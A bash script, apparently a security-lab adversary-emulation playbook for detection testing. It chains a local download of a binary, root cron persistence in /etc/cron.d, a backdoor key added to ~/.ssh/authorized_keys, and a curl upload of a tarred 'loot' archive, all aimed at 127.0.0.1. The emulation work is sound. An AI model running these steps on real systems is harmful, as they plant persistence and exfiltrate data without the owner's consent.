#!/usr/bin/env bash
# SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
# 链案：T1105 下载投放 → T1053.003 cron 驻留 → T1098.004 密钥驻留 → T1567.002 外传
"$HERE/common/build.sh" stage0.elf
python3 -m http.server 18083 >/dev/null 2>&1 & SRV=$!; sleep 0.5
curl -sf -o stage1.elf http://127.0.0.1:18083/stage0.elf
chmod 0755 stage1.elf
echo "* * * * * root $PWD/stage1.elf 127.0.0.1 8443" > /etc/cron.d/secval-chain
"$HERE/common/with_listener.sh" 8443 ./stage1.elf 127.0.0.1 8443
ssh-keygen -q -t ed25519 -N '' -f chain_ed25519 -C secval-chain 2>/dev/null
mkdir -p "$HOME/.ssh"; chmod 700 "$HOME/.ssh"
cat chain_ed25519.pub >> "$HOME/.ssh/authorized_keys"; chmod 600 "$HOME/.ssh/authorized_keys"
echo "$HOME/.ssh/authorized_keys" > system_paths.txt
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5 -i chain_ed25519 "${USER}@127.0.0.1" true 2> chain-ssh.txt || true
mkdir -p sensitive; cp /etc/hostname sensitive/ 2>/dev/null || echo lab > sensitive/host.txt
tar czf loot.tar.gz sensitive
curl -sf -F "f=@loot.tar.gz" http://127.0.0.1:18083/ >/dev/null || true
kill $SRV 2>/dev/null || true
